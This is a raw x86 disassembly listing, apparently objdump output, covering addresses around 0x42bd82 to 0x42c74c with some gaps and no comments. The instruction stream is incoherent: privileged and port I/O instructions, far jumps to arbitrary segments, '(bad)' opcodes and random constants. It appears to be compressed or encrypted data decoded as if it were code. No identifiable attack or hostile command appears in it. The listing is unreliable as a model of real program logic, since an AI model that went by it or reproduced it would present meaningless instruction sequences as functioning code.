  42bd82:	repnz scas al,BYTE PTR es:[edi]
  42bd84:	fcom   st(4)
  42bd86:	add    DWORD PTR [eax],eax
  42bd88:	add    al,0x1
  42bd8a:	add    BYTE PTR [eax],al
  42bd8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bd8d:	inc    esp
  42bd8e:	mov    ebx,0x6676b72e
  42bd93:	xchg   BYTE PTR [eax+0x75],cl
  42bd96:	test   DWORD PTR [edi+0x66],edx
  42bd99:	xchg   ecx,eax
  42bd9a:	adc    al,0xcf
  42bd9c:	lea    ecx,[edi-0x1]
  42bd9f:	mov    ebx,0x42becc23
  42bda4:	hlt    
  42bda5:	bound  ecx,QWORD PTR [esp+ebp*1-0x34]
  42bda9:	xchg   BYTE PTR [eax],dl
  42bdab:	jmp    0xb542:0x32a13855
  42bdb2:	jmp    0x35df:0x480eb9e2
  42bdb9:	gs push eax
  42bdbb:	sar    DWORD PTR [edx+0x4fac4aa5],0x49
  42bdc2:	add    al,0xdb
  42bdc4:	cmp    al,0x7e
  42bdc6:	jns    0x42bd49
  42bdc8:	int3   
  42bdc9:	inc    ebp
  42bdca:	jl     0x42be2a
  42bdcc:	sub    ebx,DWORD PTR [esi+0x6ce4a562]
  42bdd2:	inc    ebx
  42bdd3:	jne    0x42bd87
  42bdd5:	inc    ebp
  42bdd6:	loope  0x42bddd
  42bdd8:	int3   
  42bdd9:	cmc    
  42bdda:	push   esi
  42bddb:	sub    DWORD PTR ds:0xe9fd9a85,edx
  42bde1:	pop    ds
  42bde2:	and    eax,0x2a228d11
  42bde7:	into   
  42bde8:	sub    bl,BYTE PTR ds:0x7a0534
  42bdee:	mov    ebx,0xbbda9618
  42bdf3:	mov    al,ds:0xe936a2fc
  42bdf8:	cmp    ebp,DWORD PTR ds:0x37e4a624
  42bdfe:	and    al,BYTE PTR [eax+0x6a0677a]
  42be04:	mov    WORD PTR [edi+ecx*1],cs
  42be07:	jmp    0xe944:0xa5e00dcc
  42be0e:	mov    dh,0xa8
  42be10:	les    ecx,FWORD PTR [ebp-0x61c1ebd5]
  42be16:	inc    ebx
  42be17:	dec    ebp
  42be18:	scas   al,BYTE PTR es:[edi]
  42be19:	xor    al,0xe7
  42be1b:	int    0x56
  42be1d:	push   ds
  42be1e:	out    0x35,eax
  42be20:	push   cs
  42be21:	dec    eax
  42be22:	lods   eax,DWORD PTR ds:[esi]
  42be23:	enter  0x4182,0x2e
  42be27:	sti    
  42be28:	aas    
  42be29:	std    
  42be2a:	mov    bh,0xdd
  42be2c:	mov    ds:0x9c44822b,al
  42be31:	retf   0x986e
  42be34:	pop    ebx
  42be35:	clc    
  42be36:	jmp    0x8df:0x3604e59d
  42be3d:	out    dx,eax
  42be3e:	xchg   DWORD PTR [edx],edi
  42be40:	jno    0x42beaf
  42be42:	or     eax,0x2c366a3c
  42be47:	mov    ecx,0xe855cf06
  42be4c:	daa    
  42be4d:	mov    eax,0x463a9b62
  42be52:	xchg   edi,eax
  42be53:	mov    WORD PTR [esi],ss
  42be55:	leave  
  42be56:	xor    DWORD PTR [ecx],esi
  42be58:	call   0x4c460e15
  42be5d:	stc    
  42be5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42be5f:	sub    ch,BYTE PTR [ecx-0x18]
  42be62:	or     BYTE PTR [edi],ah
  42be64:	mov    ds:0x2f2ce95d,al
  42be69:	fist   WORD PTR [edx+0x33]
  42be6c:	xchg   edx,eax
  42be6d:	cmp    al,0xdb
  42be6f:	push   ebx
  42be70:	xor    DWORD PTR [eax-0x25],0x52
  42be74:	call   0x5d88:0x10ff1c86
  42be7b:	sub    DWORD PTR [eax],edx
  42be7d:	or     eax,0xbe2f9995
  42be82:	adc    esi,eax
  42be84:	repnz inc edi
  42be86:	jg     0x42bea2
  42be88:	xor    al,0x18
  42be8a:	mov    BYTE PTR [ecx],bh
  42be8c:	mov    bl,0xfd
  42be8e:	inc    edx
  42be8f:	out    0x0,eax
	...
  42bef1:	add    BYTE PTR [eax],al
  42bef3:	add    BYTE PTR [edi-0x825b8e0],dl
  42bef9:	call   FWORD PTR [edi-0x28375c93]
  42beff:	jnp    0x42be8f
  42bf01:	pop    ecx
  42bf02:	dec    ecx
  42bf03:	popf   
  42bf04:	(bad)  
  42bf06:	add    DWORD PTR [eax],eax
  42bf08:	add    al,0x1
  42bf0a:	add    BYTE PTR [eax],al
  42bf0c:	sbb    al,0x5c
  42bf0e:	pop    ecx
  42bf0f:	sbb    BYTE PTR [eax],al
  42bf11:	sub    BYTE PTR [ecx+0x30],bh
  42bf14:	in     eax,0xdc
  42bf16:	mov    BYTE PTR [ecx],dl
  42bf18:	ret    0xdf52
  42bf1b:	and    al,0xb8
  42bf1d:	out    0xa6,eax
  42bf1f:	dec    esi
  42bf20:	sbb    eax,0xf0e2de8d
  42bf25:	les    edi,FWORD PTR [edx-0x1d]
  42bf28:	jne    0x42becc
  42bf2a:	frstor [ebx+0x48a3f955]
  42bf30:	daa    
  42bf31:	ror    BYTE PTR [ebp-0x6b],0xf
  42bf35:	sahf   
  42bf36:	scas   eax,DWORD PTR es:[edi]
  42bf37:	imul   ecx,DWORD PTR [edx-0x68],0xb666a651
  42bf3e:	repz out dx,eax
  42bf40:	mov    gs,eax
  42bf42:	es es pause 
  42bf46:	mov    bh,cl
  42bf48:	les    esi,FWORD PTR [edi+0x4952b981]
  42bf4e:	stos   DWORD PTR es:[edi],eax
  42bf4f:	adc    BYTE PTR [eax-0x7d],al
  42bf52:	add    al,0xc8
  42bf54:	in     eax,dx
  42bf55:	pop    eax
  42bf56:	jae    0x42bfc9
  42bf58:	inc    ecx
  42bf59:	(bad)  
  42bf5a:	out    dx,eax
  42bf5b:	adc    al,0x8c
  42bf5d:	aam    0x54
  42bf5f:	test   al,0xc0
  42bf61:	cmp    cl,dh
  42bf63:	jo     0x42bf3b
  42bf65:	mov    dh,0xa1
  42bf67:	push   edx
  42bf68:	cmp    ebx,DWORD PTR [edx+0x17]
  42bf6b:	jne    0x42bf04
  42bf6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bf6e:	push   0x75
  42bf70:	pop    esi
  42bf71:	leave  
  42bf72:	retf   
  42bf73:	or     DWORD PTR [ebx-0x17],0xffffffe7
  42bf77:	sti    
  42bf78:	sbb    cl,BYTE PTR [ecx-0x1d6416a0]
  42bf7e:	iret   
  42bf7f:	xchg   BYTE PTR [ecx+0x28e3e58e],al
  42bf85:	jbe    0x42bf6c
  42bf87:	not    esp
  42bf89:	stc    
  42bf8a:	retf   
  42bf8b:	and    cl,al
  42bf8d:	cs arpl di,cx
  42bf90:	(bad)  
  42bf91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bf92:	je     0x42bf7f
  42bf94:	scas   eax,DWORD PTR es:[edi]
  42bf95:	and    DWORD PTR [ecx+0x4ee830c2],0x3fe774b9
  42bf9f:	popa   
  42bfa0:	jo     0x42bfea
  42bfa2:	adc    ecx,DWORD PTR [ebp+0x1c6a79bc]
  42bfa8:	push   eax
  42bfa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bfaa:	outs   dx,BYTE PTR ds:[esi]
  42bfab:	sbb    DWORD PTR [ebp-0x68],ecx
  42bfae:	dec    esi
  42bfaf:	sbb    eax,0x2a35ca9a
  42bfb4:	mov    ch,0x23
  42bfb6:	xchg   edx,eax
  42bfb7:	sbb    esp,edi
  42bfb9:	xlat   BYTE PTR ds:[ebx]
  42bfba:	jbe    0x42bfe8
  42bfbc:	jne    0x42bfaf
  42bfbe:	loop   0x42bf4c
  42bfc0:	test   eax,0x6a9eb9ab
  42bfc5:	and    al,0xdb
  42bfc7:	fisub  WORD PTR ds:0xd72137c4
  42bfcd:	call   0x7c54:0x50995003
  42bfd4:	mov    bl,0x1
  42bfd6:	arpl   WORD PTR [ebp-0x17],bx
  42bfd9:	jle    0x42bffa
  42bfdb:	test   eax,0xcfa38212
  42bfe0:	cwde   
  42bfe1:	pop    es
  42bfe2:	or     ebx,ecx
  42bfe4:	std    
  42bfe5:	les    eax,FWORD PTR [ecx+0x30]
  42bfe8:	fdivrp st(4),st
  42bfea:	or     ebx,DWORD PTR [eax+0x830e323]
  42bff0:	push   ss
  42bff1:	xor    ch,bl
  42bff3:	add    DWORD PTR [esi+0x7a],eax
  42bff6:	fcmove st,st(0)
  42bff8:	mov    dl,0x6a
  42bffa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bffb:	ror    BYTE PTR [ecx-0x46b12a9c],0x9
  42c002:	and    esp,0xffffff85
  42c005:	rcr    DWORD PTR [eax+edi*4-0x5],1
  42c009:	in     al,0xa9
  42c00b:	out    dx,eax
  42c00c:	xchg   BYTE PTR [ebp+0xf87],ah
	...
  42c072:	add    BYTE PTR [eax],al
  42c074:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	jle    0x42c05c
  42c082:	sbb    DWORD PTR [esi-0x20],esp
  42c085:	(bad)  
  42c086:	add    DWORD PTR [eax],eax
  42c088:	add    al,0x1
  42c08a:	add    BYTE PTR [eax],al
  42c08c:	push   cs
  42c08d:	ret    
  42c08e:	adc    eax,0x857b593f
  42c093:	jp     0x42c03e
  42c095:	pop    edi
  42c096:	sub    DWORD PTR [edi-0x2c],edx
  42c099:	pop    eax
  42c09a:	adc    BYTE PTR [ebx+0x68],0x2
  42c09e:	xchg   esi,eax
  42c09f:	dec    esp
  42c0a0:	pop    es
  42c0a1:	ret    0xb7ee
  42c0a4:	ret    
  42c0a5:	sbb    cl,bh
  42c0a7:	aad    0x2b
  42c0a9:	cmp    bl,dh
  42c0ab:	ss sub al,0x2a
  42c0ae:	mov    ecx,0x68eea675
  42c0b3:	in     al,0xed
  42c0b5:	cmp    eax,DWORD PTR [edi]
  42c0b7:	inc    eax
  42c0b8:	call   0x277518d7
  42c0bd:	stc    
  42c0be:	xchg   ebx,eax
  42c0bf:	fwait
  42c0c0:	inc    ebx
  42c0c1:	dec    eax
  42c0c2:	adc    DWORD PTR [ebx+0x28e24d9],edi
  42c0c8:	icebp  
  42c0c9:	pop    eax
  42c0ca:	sbb    ah,ah
  42c0cc:	push   edi
  42c0cd:	out    dx,eax
  42c0ce:	pop    es
  42c0cf:	jns    0x42c0e0
  42c0d1:	xor    DWORD PTR [ebx],0x365ab57f
  42c0d7:	mov    ah,0xb0
  42c0d9:	repz cs dec bx
  42c0dd:	dec    eax
  42c0de:	sbb    ebx,0x29
  42c0e1:	inc    edi
  42c0e2:	or     al,0x63
  42c0e4:	adc    esp,DWORD PTR [edi]
  42c0e6:	cmp    eax,ebp
  42c0e8:	int    0x43
  42c0ea:	xchg   edi,eax
  42c0eb:	mov    dh,bh
  42c0ed:	out    dx,al
  42c0ee:	jecxz  0x42c0aa
  42c0f0:	cmp    esp,DWORD PTR [edi]
  42c0f2:	loope  0x42c164
  42c0f4:	add    dh,BYTE PTR [edi+0x187b620f]
  42c0fa:	mov    ebp,esp
  42c0fc:	ret    0xc2a2
  42c0ff:	mov    dh,0x64
  42c101:	fnsave [ecx+0x6a]
  42c104:	int    0xef
  42c106:	push   ebx
  42c107:	add    BYTE PTR [edi+0x2],al
  42c10a:	sub    DWORD PTR [si],eax
  42c10d:	aaa    
  42c10e:	pop    ebp
  42c10f:	push   es
  42c110:	std    
  42c111:	sub    eax,0x1e3ee595
  42c116:	push   ebx
  42c117:	sub    cl,bl
  42c119:	jns    0x42c0aa
  42c11b:	loopne 0x42c0a1
  42c11d:	push   esi
  42c11e:	jecxz  0x42c0de
  42c120:	mov    ds:0xde7538d2,eax
  42c125:	dec    esp
  42c126:	add    edi,DWORD PTR [ecx+0x1b50fd62]
  42c12c:	cmp    BYTE PTR [edi+0x1a39034f],ah
  42c132:	mov    ch,BYTE PTR [esi-0x2fd20fde]
  42c138:	xchg   ebx,eax
  42c139:	repz shr BYTE PTR [esi+0xf],cl
  42c13d:	(bad)  
  42c13e:	jns    0x42c131
  42c140:	add    dl,BYTE PTR [edi+ebp*2-0x5671731]
  42c147:	in     al,dx
  42c148:	fimul  WORD PTR [eax-0x4a]
  42c14b:	jg     0x42c0cf
  42c14d:	fs pop ebp
  42c14f:	bound  eax,QWORD PTR [ecx-0x5f43138e]
  42c155:	dec    edx
  42c156:	jo     0x42c1c2
  42c158:	out    0xf1,al
  42c15a:	mov    esi,0xcabaa2a5
  42c15f:	inc    ebp
  42c160:	dec    edi
  42c161:	ret    
  42c162:	lea    edx,[ebp-0x1e]
  42c165:	in     al,0x75
  42c167:	je     0x42c154
  42c169:	xlat   BYTE PTR ds:[ebx]
  42c16a:	xchg   bl,bl
  42c16c:	outs   dx,BYTE PTR ds:[esi]
  42c16d:	aaa    
  42c16e:	mov    edx,0x2ae40248
  42c173:	rol    DWORD PTR [ebx+ecx*1-0x63],cl
  42c177:	ins    DWORD PTR es:[edi],dx
  42c178:	cwde   
  42c179:	mov    ah,0xd6
  42c17c:	mov    eax,0x965bf6bb
  42c181:	out    0x6e,al
  42c183:	xor    esp,ebx
  42c185:	sbb    DWORD PTR [esi-0x30],ebx
  42c188:	cmp    esi,DWORD PTR [ebp+0x79]
  42c18b:	jns    0x42c183
  42c18d:	pop    esi
  42c18e:	sbb    al,0xd5
	...
  42c1f4:	imul   eax,DWORD PTR [edx-0x10105133],0x90f2c76b
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	or     eax,0xe414b3d5
  42c205:	xlat   BYTE PTR ds:[ebx]
  42c206:	add    DWORD PTR [eax],eax
  42c208:	add    al,0x1
  42c20a:	add    BYTE PTR [eax],al
  42c20c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c20d:	fistp  WORD PTR [edx-0x3f37a5cd]
  42c213:	call   0xb082:0x278d4200
  42c21a:	popa   
  42c21b:	dec    ebx
  42c21c:	pop    ss
  42c21d:	call   DWORD PTR [edx+0x5]
  42c220:	pop    es
  42c221:	int    0xcb
  42c223:	jae    0x42c1f2
  42c225:	fwait
  42c226:	xchg   edi,edi
  42c228:	ins    BYTE PTR es:[edi],dx
  42c229:	and    BYTE PTR [edx+0x7adf8a2a],bl
  42c22f:	push   eax
  42c230:	fidiv  DWORD PTR [ecx+0x3]
  42c233:	jecxz  0x42c1d8
  42c235:	lahf   
  42c236:	jmp    0x42c29c
  42c238:	fs inc esp
  42c23a:	in     eax,0xd2
  42c23c:	pop    es
  42c23d:	mov    DWORD PTR [ebx+0x19],edi
  42c240:	sbb    eax,0x3aa81f7b
  42c245:	inc    ebp
  42c246:	aam    0x50
  42c248:	mov    ebx,DWORD PTR [eax+0x6e]
  42c24b:	push   0x8c401330
  42c250:	mov    ch,0x1a
  42c252:	or     eax,0x5f05587a
  42c257:	mov    ax,ds:0x8b5080a9
  42c25d:	cmp    edx,ebp
  42c25f:	out    0xc,eax
  42c261:	sbb    ah,BYTE PTR [ebp+0x2b8b4de]
  42c267:	aaa    
  42c268:	xchg   ecx,eax
  42c269:	push   ds
  42c26a:	pop    ss
  42c26b:	in     eax,0xd4
  42c26d:	repz dec edx
  42c26f:	adc    al,0xed
  42c271:	ds pushf 
  42c273:	push   ss
  42c274:	cmp    eax,0x9b1e835c
  42c279:	daa    
  42c27a:	lea    edi,ss:[edx]
  42c27d:	imul   ebx,DWORD PTR [esi],0xe295ce0
  42c283:	mov    ch,BYTE PTR [ecx+0x4ec37529]
  42c289:	push   ebp
  42c28a:	add    dl,al
  42c28c:	cdq    
  42c28d:	popa   
  42c28e:	aaa    
  42c28f:	push   edx
  42c290:	js     0x42c2b3
  42c292:	mov    eax,ds:0x353cbc28
  42c297:	adc    BYTE PTR [edi],al
  42c299:	nop
  42c29a:	test   al,0xc9
  42c29c:	mov    esp,0x24fa7256
  42c2a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c2a2:	pop    ebx
  42c2a3:	sbb    BYTE PTR [ebx+ebx*8-0x5b],al
  42c2a7:	xor    DWORD PTR [ebp-0x5cfe089a],0x28b72219
  42c2b1:	ins    DWORD PTR es:[edi],dx
  42c2b2:	int    0x94
  42c2b4:	rcr    DWORD PTR [edx+0x31ae5b31],1
  42c2ba:	(bad)  
  42c2bc:	ins    BYTE PTR es:[edi],dx
  42c2bd:	add    DWORD PTR [ecx],0x52
  42c2c0:	lds    edi,FWORD PTR [ebx]
  42c2c2:	jne    0x42c24e
  42c2c4:	inc    edx
  42c2c5:	xchg   edx,eax
  42c2c6:	inc    esi
  42c2c7:	add    al,0x5c
  42c2c9:	sahf   
  42c2ca:	jmp    0x2acf45f9
  42c2cf:	dec    edi
  42c2d0:	repnz imul edx,DWORD PTR [ebp-0x2f863357],0xcecbf67c
  42c2db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c2dc:	ss shl dl,1
  42c2df:	add    al,0x46
  42c2e1:	(bad)
  42c2e5:	xchg   DWORD PTR [edx+0x18],ebx
  42c2e8:	push   ebp
  42c2e9:	scas   eax,DWORD PTR es:[edi]
  42c2ea:	push   ebx
  42c2ec:	in     al,0x6f
  42c2ee:	xor    cl,BYTE PTR [edi-0x9]
  42c2f1:	xchg   BYTE PTR [ebp+edi*2-0x41f0be8a],bh
  42c2f8:	f2xm1  
  42c2fa:	call   0xb032bdb2
  42c2ff:	stos   DWORD PTR es:[edi],eax
  42c300:	lock in al,dx
  42c302:	add    DWORD PTR [ebx-0x1b90703b],ebp
  42c308:	call   0x157cd87b
  42c30d:	sbb    bl,BYTE PTR [ecx-0x4a]
	...
  42c374:	out    0xf,al
  42c376:	fldcw  WORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0xa89ad6f6
  42c383:	push   ebp
  42c384:	call   0x442c561
  42c389:	add    DWORD PTR [eax],eax
  42c38b:	add    BYTE PTR [ebx+0x5aa0ceef],al
  42c391:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c392:	mov    al,ds:0x2f9b863
  42c397:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c398:	inc    edi
  42c399:	cmc    
  42c39a:	adc    DWORD PTR [ebx+0x1a5ca4cb],eax
  42c3a0:	or     BYTE PTR [edx],ah
  42c3a2:	pop    ds
  42c3a3:	add    DWORD PTR [esi],ebx
  42c3a5:	hlt    
  42c3a6:	xchg   BYTE PTR [ecx],bl
  42c3a8:	retf   
  42c3a9:	adc    ebp,DWORD PTR [eax+0x17bf60b6]
  42c3af:	mov    dl,0xe
  42c3b1:	adc    eax,0xf5698127
  42c3b6:	aaa    
  42c3b7:	ds inc ebp
  42c3b9:	in     eax,0xe9
  42c3bb:	test   DWORD PTR [ebx-0x5c],0x11c186b1
  42c3c2:	ret    0x4a7
  42c3c5:	out    dx,eax
  42c3c6:	out    dx,eax
  42c3c7:	bound  ebp,QWORD PTR [ebp+0x40759159]
  42c3cd:	(bad)  
  42c3ce:	dec    esp
  42c3cf:	shl    BYTE PTR [eax+ebp*4+0x5b],cl
  42c3d3:	fld    DWORD PTR [edi+0x1a]
  42c3d6:	clc    
  42c3d7:	ins    DWORD PTR es:[edi],dx
  42c3d8:	nop
  42c3d9:	mov    dh,0xe9
  42c3db:	call   FWORD PTR [esi+0x6dc1c00f]
  42c3e1:	xor    edx,DWORD PTR [ebx+ebx*4-0x27d92276]
  42c3e8:	lds    ebp,FWORD PTR [esi-0x7b]
  42c3eb:	out    0xc9,eax
  42c3ed:	sub    BYTE PTR [eax-0x71],al
  42c3f0:	rol    bl,1
  42c3f2:	shl    BYTE PTR [edi-0x3890d8b7],1
  42c3f8:	xchg   edi,eax
  42c3f9:	jmp    0x42c39a
  42c3fb:	add    DWORD PTR [ecx],esi
  42c3fd:	out    0xb8,al
  42c3ff:	ins    DWORD PTR es:[edi],dx
  42c400:	xchg   ebp,eax
  42c401:	out    dx,eax
  42c402:	hlt    
  42c403:	fisttp QWORD PTR [eax]
  42c405:	lods   al,BYTE PTR ds:[esi]
  42c406:	cli    
  42c407:	mov    esi,0x9bfacc6e
  42c40c:	pop    esi
  42c40d:	retf   0x7c97
  42c410:	in     eax,0xe6
  42c412:	pop    esp
  42c413:	xchg   BYTE PTR [eax+0x5e6b1b5b],dl
  42c419:	xor    BYTE PTR [esi+0x5615eb84],0x78
  42c420:	sti    
  42c421:	pop    esp
  42c422:	inc    ecx
  42c423:	int3   
  42c424:	add    al,0xb7
  42c426:	xchg   edx,eax
  42c427:	imul   eax,DWORD PTR [ebx+0xa],0xfffffff6
  42c42b:	mov    edx,0x3c45e2ea
  42c430:	(bad)  
  42c432:	(bad)  
  42c433:	pop    esp
  42c434:	jb     0x42c3e4
  42c436:	sub    eax,0x3e7fc385
  42c43b:	xchg   BYTE PTR [ebx],dh
  42c43d:	stc    
  42c43e:	fucomi st,st(6)
  42c440:	add    al,0x74
  42c442:	push   ecx
  42c443:	pop    ax
  42c445:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c446:	shl    DWORD PTR [edx+0x3d],1
  42c449:	fidiv  WORD PTR [edi]
  42c44b:	and    BYTE PTR [edi],ch
  42c44d:	mov    DWORD PTR [esi+eax*1+0x6b7021a6],0x25b71c
  42c458:	cdq    
  42c459:	dec    ebx
  42c45a:	je     0x42c4a9
  42c45c:	pop    edi
  42c45d:	ret    0x8bad
  42c460:	sub    DWORD PTR [esi+0x34],0x73
  42c464:	cld    
  42c465:	cmp    eax,0x41d6fb02
  42c46a:	mov    al,ds:0x2bd9deac
  42c46f:	ret    
  42c470:	inc    eax
  42c471:	mov    eax,0xb539ad58
  42c476:	popf   
  42c477:	lds    ebp,FWORD PTR [eax+0xf]
  42c47a:	aaa    
  42c47b:	adc    dl,bh
  42c47d:	test   eax,0x87a1d901
  42c482:	push   ecx
  42c483:	sub    ecx,DWORD PTR [edi-0x72]
  42c486:	xor    eax,0x95326821
  42c48b:	je     0x42c497
  42c48d:	in     al,dx
  42c48e:	mov    al,ds:0x28
	...
  42c4f3:	add    ah,ch
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0xd834,0x34
  42c502:	cmp    DWORD PTR [eax],0x1d9ec
  42c508:	add    al,0x1
  42c50a:	add    BYTE PTR [eax],al
  42c50c:	lods   al,BYTE PTR ds:[esi]
  42c50d:	inc    esi
  42c50e:	iret   
  42c50f:	mov    BYTE PTR [edi],bl
  42c511:	adc    al,0x74
  42c513:	iret   
  42c514:	sbb    dl,dh
  42c516:	mov    edx,DWORD PTR [esi+0x76f90281]
  42c51c:	in     al,dx
  42c51d:	mov    edx,gs
  42c51f:	mov    cl,0xe5
  42c521:	adc    eax,0xc1dc8f78
  42c526:	jmp    0x42c534
  42c528:	mov    edx,0xa71c6a8d
  42c52d:	dec    eax
  42c52e:	add    al,0x9e
  42c530:	mov    esi,0x6515c69a
  42c535:	adc    BYTE PTR [edx-0x62cf80bf],ch
  42c53b:	outs   dx,DWORD PTR ds:[esi]
  42c53c:	js     0x42c4c6
  42c53e:	xor    eax,0xc1fb9a6e
  42c543:	outs   dx,DWORD PTR ds:[esi]
  42c544:	pop    es
  42c545:	rol    DWORD PTR [ebp-0x59c90303],1
  42c54b:	cwde   
  42c54c:	jl     0x42c594
  42c54e:	sub    cl,BYTE PTR [bx+di+0x4c38]
  42c553:	rcr    BYTE PTR [ebp+eiz*4-0x5b106f88],1
  42c55a:	pop    esp
  42c55b:	(bad)  
  42c55c:	dec    eax
  42c55d:	es push esi
  42c55f:	cmp    ebx,ebp
  42c561:	add    bl,ch
  42c563:	stc    
  42c564:	gs push ss
  42c566:	inc    edx
  42c567:	call   0x15cf:0xefab9ad1
  42c56e:	add    eax,0x6f4c365
  42c573:	lock loope 0x42c5d1
  42c576:	stos   DWORD PTR es:[edi],eax
  42c577:	adc    cl,BYTE PTR [edx]
  42c579:	stos   BYTE PTR es:[edi],al
  42c57a:	imul   esi,DWORD PTR [ebx],0xffffffa7
  42c57d:	cmp    edx,DWORD PTR [ecx+edi*2]
  42c580:	call   0x1a150ee7
  42c585:	sub    eax,0x267c15dc
  42c58a:	mov    al,ds:0x4ef18ee0
  42c58f:	mov    edi,0x5c550690
  42c594:	xor    BYTE PTR [esi-0x21c90bcd],ah
  42c59a:	and    BYTE PTR [eax],bh
  42c59c:	jl     0x42c592
  42c59e:	ror    cl,1
  42c5a0:	loopne 0x42c5a9
  42c5a2:	or     eax,0xeeb539fa
  42c5a7:	outs   dx,BYTE PTR ds:[esi]
  42c5a8:	aam    0x9c
  42c5aa:	rcl    DWORD PTR ds:0xce030090,cl
  42c5b0:	lss    ebx,FWORD PTR [ebp+0x792e2e48]
  42c5b7:	fldenv [ecx-0x52d57a99]
  42c5bd:	clc    
  42c5be:	xor    al,dl
  42c5c0:	push   esi
  42c5c1:	js     0x42c58d
  42c5c3:	hlt    
  42c5c4:	mov    bh,0x33
  42c5c6:	xchg   BYTE PTR [edx],dh
  42c5c8:	enter  0xcde9,0x21
  42c5cc:	gs scas eax,DWORD PTR es:[edi]
  42c5ce:	ror    DWORD PTR [edx],0x0
  42c5d1:	test   BYTE PTR [edi+0x5a2e4e16],bl
  42c5d7:	loop   0x42c57c
  42c5d9:	in     eax,dx
  42c5da:	dec    esi
  42c5db:	push   cs
  42c5dc:	mov    ch,0x63
  42c5de:	sub    al,0xdd
  42c5e0:	inc    ecx
  42c5e1:	in     eax,0xeb
  42c5e3:	adc    al,0x4b
  42c5e5:	adc    BYTE PTR [ebp+0x51a51a7e],al
  42c5eb:	bound  edi,QWORD PTR [eax-0x72]
  42c5ee:	lahf   
  42c5ef:	push   es
  42c5f0:	cmp    eax,0x4824b456
  42c5f5:	adc    edx,ecx
  42c5f7:	cli    
  42c5f8:	add    BYTE PTR [esi-0x52],dl
  42c5fb:	mov    eax,0x438ddee2
  42c600:	xor    DWORD PTR [edx],eax
  42c602:	mov    ebx,0xd0a564ba
  42c607:	fcomp  QWORD PTR [edi-0x24]
  42c60a:	repnz cmc 
  42c60c:	inc    eax
  42c60d:	xchg   dl,dl
  42c60f:	mov    cl,0x0
	...
  42c671:	add    BYTE PTR [eax],al
  42c673:	add    BYTE PTR [ebp+0x48],bl
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx-0x6f920395]
  42c681:	jns    0x42c654
  42c683:	iret   
  42c684:	lock fiadd DWORD PTR [ecx]
  42c687:	add    BYTE PTR [ecx+eax*1],al
  42c68a:	add    BYTE PTR [eax],al
  42c68c:	inc    ebp
  42c68d:	jge    0x42c697
  42c68f:	mov    eax,ds:0x6762490b
  42c694:	push   0xfffffffd
  42c696:	jns    0x42c620
  42c698:	sub    eax,0xfe741e9f
  42c69d:	sbb    ecx,DWORD PTR [ecx+0x2b]
  42c6a0:	lahf   
  42c6a1:	or     BYTE PTR [ebp+0x32],al
  42c6a4:	inc    ax
  42c6a6:	cmp    DWORD PTR [edi+eiz*2+0x5e],ecx
  42c6aa:	ds aad 0x6
  42c6ad:	push   ds
  42c6ae:	je     0x42c6b0
  42c6b0:	popa   
  42c6b1:	sub    BYTE PTR [ebp+0x2004710a],dh
  42c6b7:	cwde   
  42c6b8:	sbb    al,0x20
  42c6ba:	xchg   edx,eax
  42c6bb:	or     eax,0x44397d62
  42c6c0:	pop    eax
  42c6c1:	lods   al,BYTE PTR ds:[esi]
  42c6c2:	int    0xfa
  42c6c4:	pop    ds
  42c6c5:	call   0x93ee1f52
  42c6ca:	xchg   edx,eax
  42c6cb:	repz lds esi,FWORD PTR [edi-0x80]
  42c6cf:	dec    esi
  42c6d0:	in     al,dx
  42c6d1:	push   edi
  42c6d2:	mov    eax,0xf893a24d
  42c6d7:	jae    0x42c6da
  42c6d9:	outs   dx,BYTE PTR ds:[esi]
  42c6da:	fcmovbe st,st(6)
  42c6dc:	pop    ds
  42c6dd:	mov    ds:0xfa226afe,eax
  42c6e2:	fmul   QWORD PTR [ebp-0x5b113df7]
  42c6e8:	outs   dx,DWORD PTR ds:[esi]
  42c6e9:	dec    esi
  42c6ea:	jae    0x42c76a
  42c6ec:	mov    dh,0xfa
  42c6ee:	sub    ebp,ebp
  42c6f0:	jnp    0x42c6d8
  42c6f2:	or     DWORD PTR [ebp-0x651d87d6],esi
  42c6f8:	xlat   BYTE PTR ds:[ebx]
  42c6f9:	test   BYTE PTR [esi+0x16],0x26
  42c6fd:	test   eax,0xbe7c24a5
  42c702:	(bad)  
  42c703:	pop    ds
  42c704:	xor    eax,0xb5d37331
  42c709:	adc    esp,DWORD PTR [edx-0x275aea7b]
  42c70f:	adc    eax,0x798537ab
  42c714:	fimul  DWORD PTR [edi-0x12ee63eb]
  42c71a:	stc    
  42c71b:	mov    esi,cs
  42c71d:	sbb    edi,DWORD PTR [ebp-0x6ef75e82]
  42c723:	pop    ecx
  42c724:	inc    ebp
  42c725:	dec    esi
  42c726:	mov    dh,0x91
  42c728:	cmp    eax,0xb30f332c
  42c72d:	das    
  42c72e:	imul   ebx,DWORD PTR [ebx+ebp*4-0x5],0xcd575e54
  42c736:	sub    DWORD PTR ds:0xc90fd7b3,ebp
  42c73c:	mov    ch,0x56
  42c73e:	mov    ds:0x71f0546,eax
  42c743:	cmp    ebp,ecx
  42c745:	pop    eax
  42c746:	rcr    esi,1
  42c748:	clc    
  42c749:	aas    
  42c74a:	add    edx,edi
  42c74c:	sub    al,BYTE PTR [eax]
